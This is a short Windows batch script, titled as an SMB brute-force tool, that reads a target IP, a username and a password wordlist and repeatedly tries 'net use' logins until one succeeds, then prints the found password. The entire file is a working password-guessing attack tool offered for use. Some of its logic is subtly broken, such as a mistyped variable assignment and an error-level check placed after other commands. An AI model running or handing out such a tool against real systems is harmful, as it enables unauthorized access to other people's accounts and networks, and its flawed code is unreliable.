@echo off
title SMB BruteForce - by 7moodi
color D
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist ="Enter Password: "

set /a count=0
for /f %%a in  (%wordlist%) do (
   set pass=%%a
   call :attempt
)
echo Password not found :(
pause
exit

:success
echo.
echo Password Found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success